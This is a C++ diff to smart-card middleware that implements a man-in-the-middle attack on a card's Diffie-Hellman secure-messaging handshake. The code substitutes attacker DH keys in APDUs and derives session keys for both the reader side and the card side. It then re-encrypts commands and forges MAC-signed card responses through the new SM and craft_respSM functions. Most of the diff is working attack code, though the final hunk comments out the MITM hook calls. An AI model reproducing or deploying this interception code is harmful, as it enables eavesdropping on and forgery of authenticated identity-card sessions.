@@ -6,6 +6,7 @@
 #include <stdio.h>
 #include "../Crypto/AES.h"
 #include "../Crypto/RSA.h"
+#include "../Crypto/MAC.h"
 #include "../Crypto/DES3.h"
 #include "../PCSC/PCSC.h"
 #include "../Cryptopp/cryptlib.h"
@@ -28,6 +29,7 @@ void GetCertInfo(CryptoPP::BufferedTransformation & certin,
                std::string & notAfter,
                CryptoPP::Integer& mod,
                CryptoPP::Integer& pubExp);
+
 
 
 typedef enum {
@@ -75,15 +77,154 @@ BYTE MSE_SET1[] = { 0x10, 0x22, 0x41, 0xa6 };
 BYTE MSE_SET2[] = { 0x00, 0x22, 0x41, 0xa6 };
 BYTE apdu_GET_DATA_Data1[] = { 0x00, 0xcb, 0x3f, 0xff, 0x06, 0x4d, 0x04, 0xa6, 0x02, 0x91, 0x00 };
 BYTE apdu_GET_DATA_Data2[] = { 0x00, 0xc0, 0x00, 0x00, 0x08 };
-ByteDynArray dh_pubKey, dh_ICCpubKey;
-ByteDynArray dh_pubKey_mitm, dh_prKey_mitm, dh_ICCpubKey_mitm, dh_ICCprKey_mitm;
-BYTE *dh_pubKey_mitmBytes, *dh_ICCpubKey_mitmBytes;
-BYTE dh_pubKeyBytes[256] = {};
+ByteDynArray dh_IFDpubKey, dh_ICCpubKey;
+ByteDynArray dh_pubKey_mitm, dh_prKey_mitm;
+BYTE *dh_pubKey_mitmBytes;
+BYTE dh_IFDpubKeyBytes[256] = {};
 BYTE dh_ICCpubKeyBytes[256] = {};
 uint8_t diffENC[] = { 0x00, 0x00, 0x00, 0x01 };
 uint8_t diffMAC[] = { 0x00, 0x00, 0x00, 0x02 };
 ByteDynArray sessENC_IFD, sessMAC_IFD, sessSSC_IFD;
 ByteDynArray sessENC_ICC, sessMAC_ICC, sessSSC_ICC;
+
+void increment(ByteArray &seq) {
+	for (size_t i = seq.size() - 1; i >= 0; i--) {
+		if (seq[i] < 255) {
+			seq[i]++;
+			for (size_t j = i + 1; j < seq.size(); j++)
+				seq[j] = 0;
+			return;
+		}
+	}
+}
+
+ByteArray craft_respSM(ByteArray &keyEnc, ByteArray &keySig, ByteDynArray &resp, ByteArray &seq) {
+	increment(sessSSC_ICC);
+	increment(sessSSC_IFD);
+	ByteDynArray calcMac;
+	ByteDynArray swBa, tagMacBa;
+	ByteDynArray iv(8);
+	iv.fill(0); // IV for APDU encryption should be 0. Please refer to IAS specification §7.1.9 Secure messaging – Command APDU protection
+	CDES3 encDes(keyEnc, iv);
+	CMAC sigMac(keySig, iv);
+
+	calcMac = seq;
+	calcMac.append(resp.mid(0, resp[0 + 1] + 2));
+
+	BYTE sw[2] = {0x90, 0x00};
+	BYTE tagMac[2] = { 0x8e, 0x08};
+	swBa = VarToByteArray(sw);
+	tagMacBa = VarToByteArray(tagMac);
+
+
+	ByteDynArray tmp = resp.mid(0, resp[0 + 1] + 2);
+	auto smMac = sigMac.Mac(ISOPad(calcMac));
+	resp.set(&tmp, &tagMacBa, &smMac, &swBa);
+	return resp;
+}
+
+
+ByteDynArray SM(ByteArray &keyEnc, ByteArray &keySig, ByteArray &apdu, ByteArray &seq) {
+	init_func
+
+	std::string dmp;
+	ODS(dumpHexData(seq, dmp).c_str());
+
+	increment(sessSSC_ICC);
+	increment(sessSSC_IFD);
+
+    ODS(dumpHexData(seq, dmp).c_str());
+
+	ByteDynArray smHead;
+	smHead = apdu.left(4);
+	smHead[0] |= 0x0C;
+//    printf("apdu: %s\n", dumpHexData(smHead).c_str());
+
+	auto calcMac = ISOPad(ByteDynArray(seq).append(smHead));
+
+//    printf("calcMac: %s\n", dumpHexData(calcMac).c_str());
+
+	ByteDynArray iv(8);
+	iv.fill(0); // IV for APDU encryption and signature should be 0. Please refer to IAS specification §7.1.9 Secure messaging – Command APDU protection
+
+//    printf("iv: %s\n", dumpHexData(iv).c_str());
+
+//    printf("keyEnc: %s\n", dumpHexData(keyEnc).c_str());
+	CDES3 encDes(keyEnc, iv);
+
+//    printf("keySig: %s\n", dumpHexData(keySig).c_str());
+
+    CMAC sigMac(keySig, iv);
+
+	uint8_t Val01 = 1;
+//    uint8_t Val00 = 0;
+
+	ByteDynArray datafield, doob;
+	if (apdu[4] != 0 && apdu.size() > 5) {
+
+        ByteDynArray enc = encDes.RawEncode(ISOPad(apdu.mid(5, apdu[4])));
+
+//        printf("enc 1: %s\n", dumpHexData(enc).c_str());
+
+		if ((apdu[1] & 1) == 0)
+			doob.setASN1Tag(0x87, VarToByteDynArray(Val01).append(enc));
+		else
+			doob.setASN1Tag(0x85, enc);
+
+		calcMac.append(doob);
+		datafield.append(doob);
+
+//        printf("calcMac 1: %s\n", dumpHexData(calcMac).c_str());
+//        printf("datafield 1: %s\n", dumpHexData(datafield).c_str());
+	}
+	if (apdu[4] == 0 && apdu.size() > 7) {
+
+		ByteDynArray enc = encDes.RawEncode(ISOPad(apdu.mid(7, (apdu[5] << 8)| apdu[6] )));
+		if ((apdu[1] & 1) == 0)
+			doob.setASN1Tag(0x87, VarToByteDynArray(Val01).append(enc));
+		else
+			doob.setASN1Tag(0x85, enc);
+
+		calcMac.append(doob);
+		datafield.append(doob);
+
+//        printf("calcMac 2: %s\n", dumpHexData(calcMac).c_str());
+//        printf("datafield 2: %s\n", dumpHexData(datafield).c_str());
+	}
+	if (apdu.size() == 5 || apdu.size() == (apdu[4] + 6)) {
+		uint8_t le = apdu[apdu.size() - 1];
+        ByteArray leBa = VarToByteArray(le);
+		doob.setASN1Tag(0x97, leBa);
+		calcMac.append(doob);
+		datafield.append(doob);
+
+//        printf("calcMac 3: %s\n", dumpHexData(calcMac).c_str());
+//        printf("datafield 3: %s\n", dumpHexData(datafield).c_str());
+	}
+
+    ByteDynArray macBa = sigMac.Mac(ISOPad(calcMac));
+//    printf("macBa: %s\n", dumpHexData(macBa).c_str());
+
+    ByteDynArray tagMacBa = ASN1Tag(0x8e, macBa);
+//    printf("tagMacBa: %s\n", dumpHexData(tagMacBa).c_str());
+	datafield.append(tagMacBa);
+
+//    printf("datafield 4: %s\n", dumpHexData(datafield).c_str());
+
+	ByteDynArray elabResp;
+	if (datafield.size()<0x100)
+		elabResp.set(&smHead, (uint8_t)datafield.size(), &datafield, (uint8_t)0x00);
+	else {
+		auto len = datafield.size();
+		auto lenBA = VarToByteArray(len);
+        ByteArray lenBa = lenBA.reverse().right(3);
+
+		elabResp.set(&smHead, &lenBa, &datafield, (uint8_t)0x00, (uint8_t)0x00);
+	}
+
+//    printf("elabResp: %s\n", dumpHexData(elabResp).c_str());
+	return elabResp;
+}
 
 void mitm_out(BYTE *apdu, DWORD apduSize) {
 	prev_apduSize = curr_apduSize;
@@ -118,11 +259,11 @@ void mitm_out(BYTE *apdu, DWORD apduSize) {
 			dh_pubKey_mitm = rsa.RSA_PURE(dhg);
 			dh_pubKey_mitmBytes = dh_pubKey_mitm.data();
 			
-			memcpy(dh_pubKeyBytes, apdu+15, apduSize-15);
+			memcpy(dh_IFDpubKeyBytes, apdu+15, apduSize-15);
 			// copy in apdu+15 from dh_pubKey_mitmBytes apduSize-15 bytes
 			memcpy(apdu+15, dh_pubKey_mitmBytes, apduSize-15);
 		}else if (memcmp(curr_apdu, MSE_SET2, 4) == 0) {
-			memcpy(dh_pubKeyBytes+245, apdu+5, 11);
+			memcpy(dh_IFDpubKeyBytes+245, apdu+5, 11);
 			// copy in apdu+5 from dh_pubKey_mitmBytes+245 11 bytes
 			memcpy(apdu+5, dh_pubKey_mitmBytes+245, 11);
 	
@@ -138,9 +279,21 @@ void mitm_out(BYTE *apdu, DWORD apduSize) {
 			memcpy(supp,apdu+8,8);
 			ByteArray encData = VarToByteArray(supp);
 			ByteDynArray data = encDes.RawDecode(encData);
-			//data.resize(RemoveISOPad(data),true);
+			data.resize(RemoveISOPad(data),true);
 			LOG_DEBUG("data dec:");
 			LOG_BUFFER(data.data(), data.size());
+
+			ByteArray emptyBa;
+			ByteDynArray smApdu;
+			uint8_t le = 0;
+			BYTE head[] = { 0x00, 0x22, 0x81, 0xb6 };
+			ByteArray headBa = VarToByteArray(head);
+			smApdu.set(&headBa, (uint8_t)data.size(), &data, le);
+			smApdu = SM(sessENC_ICC, sessMAC_ICC, smApdu, sessSSC_ICC);
+			memcpy(apdu, smApdu.data(), smApdu.size());
+
+			LOG_DEBUG("apdu modified:");
+			LOG_BUFFER(smApdu.data(), smApdu.size());
 		}
 		break;
 	default:
@@ -202,38 +355,39 @@ void mitm_in(BYTE *resp, DWORD respSize) {
 
 		break;
 	case DH_KEY_EXCHANGE:
+	//TO FIX this sessENC_IFD != sessENC
 		LOG_DEBUG("DH_KEY_EXCHANGE");
 		if (memcmp(curr_apdu, apdu_GET_DATA_Data1, 11) == 0) {
-			do {
-				dh_ICCprKey_mitm.resize(dh_q.size());
-				dh_ICCprKey_mitm.random();
-			} while (dh_q[0] < dh_ICCprKey_mitm[0]);
-			dh_ICCprKey_mitm.right(1)[0] |= 1;
-			ByteDynArray dhg(dh_g.size());
-			dhg.fill(0);
-			dhg.rightcopy(dh_g);
-			CRSA rsa(dh_p, dh_ICCprKey_mitm);
-
-			dh_ICCpubKey_mitm = rsa.RSA_PURE(dhg);
-			dh_ICCpubKey_mitmBytes = dh_ICCpubKey_mitm.data();
+			//do {
+			//	dh_ICCprKey_mitm.resize(dh_q.size());
+			//	dh_ICCprKey_mitm.random();
+			//} while (dh_q[0] < dh_ICCprKey_mitm[0]);
+			//dh_ICCprKey_mitm.right(1)[0] |= 1;
+			//ByteDynArray dhg(dh_g.size());
+			//dhg.fill(0);
+			//dhg.rightcopy(dh_g);
+			//CRSA rsa(dh_p, dh_ICCprKey_mitm);
+			//
+			//dh_ICCpubKey_mitm = rsa.RSA_PURE(dhg);
+			//dh_ICCpubKey_mitmBytes = dh_ICCpubKey_mitm.data();
 			
 			memcpy(dh_ICCpubKeyBytes, resp+8, 248);
 			//
-			memcpy(resp+8, dh_ICCpubKey_mitmBytes, 248);
+			memcpy(resp+8, dh_pubKey_mitmBytes, 248);
 		} else if (memcmp(curr_apdu, apdu_GET_DATA_Data2, 5) == 0) {
 			memcpy(dh_ICCpubKeyBytes+248, resp, 8);
 			//
-			memcpy(resp, dh_ICCpubKey_mitmBytes+248, 8);
+			memcpy(resp, dh_pubKey_mitmBytes+248, 8);
 			
-			dh_ICCpubKey = VarToByteDynArray(dh_ICCpubKey_mitmBytes);
-			CRSA rsa_IFD(dh_p, dh_ICCprKey_mitm);
-			ByteDynArray secretIFD = rsa_IFD.RSA_PURE(dh_pubKey);
+			dh_ICCpubKey = VarToByteDynArray(dh_ICCpubKeyBytes);
+			dh_IFDpubKey = VarToByteDynArray(dh_IFDpubKeyBytes);
+
+			CRSA rsa(dh_p, dh_prKey_mitm);
+			ByteDynArray secretIFD = rsa.RSA_PURE(dh_IFDpubKey);
 			sessENC_IFD = sha256.Digest(ByteDynArray(secretIFD).append(VarToByteArray(diffENC))).left(16);
 			sessMAC_IFD = sha256.Digest(ByteDynArray(secretIFD).append(VarToByteArray(diffMAC))).left(16);
 
-			dh_pubKey = VarToByteDynArray(dh_pubKeyBytes);
-			CRSA rsa_ICC(dh_p, dh_prKey_mitm);
-			ByteDynArray secretICC = rsa_ICC.RSA_PURE(dh_ICCpubKey);
+			ByteDynArray secretICC = rsa.RSA_PURE(dh_ICCpubKey);
 			sessENC_ICC = sha256.Digest(ByteDynArray(secretICC).append(VarToByteArray(diffENC))).left(16);
 			sessMAC_ICC = sha256.Digest(ByteDynArray(secretICC).append(VarToByteArray(diffMAC))).left(16);
 		
@@ -252,7 +406,18 @@ void mitm_in(BYTE *resp, DWORD respSize) {
 			stage = DAPP;
 		}
 		break;
-	case END:
+	case DAPP:
+			{
+				LOG_DEBUG("resp:");
+				LOG_BUFFER(resp, 16);
+				BYTE temp[16] = {};
+				memcpy(temp, resp, 16); 
+				ByteDynArray respBa = VarToByteArray(temp);
+				ByteArray crafted_resp = craft_respSM(sessENC_IFD, sessMAC_IFD, respBa, sessSSC_IFD);
+				memcpy(resp, crafted_resp.data(), 16);
+				LOG_DEBUG("crafted_resp:");
+				LOG_BUFFER(crafted_resp.data(), crafted_resp.size());
+			}
 		break;
 	default:
 		break;
@@ -307,9 +472,9 @@ int TokenTransmitCallback(CSlot *data, BYTE *apdu, DWORD apduSize, BYTE *resp, D
                   
 	//ODS(String().printf("APDU: %s\n", dumpHexData(ByteArray(apdu, apduSize), String()).lock()).lock());
 	// START MITM
-    mitm_out(apdu, apduSize);
+    //mitm_out(apdu, apduSize);
 	auto ris = SCardTransmit(data->hCard, SCARD_PCI_T1, apdu, apduSize, NULL, resp, respSize);
-    mitm_in(resp, *respSize);
+    //mitm_in(resp, *respSize);
 	// END MITM
     
 	LOG_DEBUG("TokenTransmitCallback - Smart card response:");
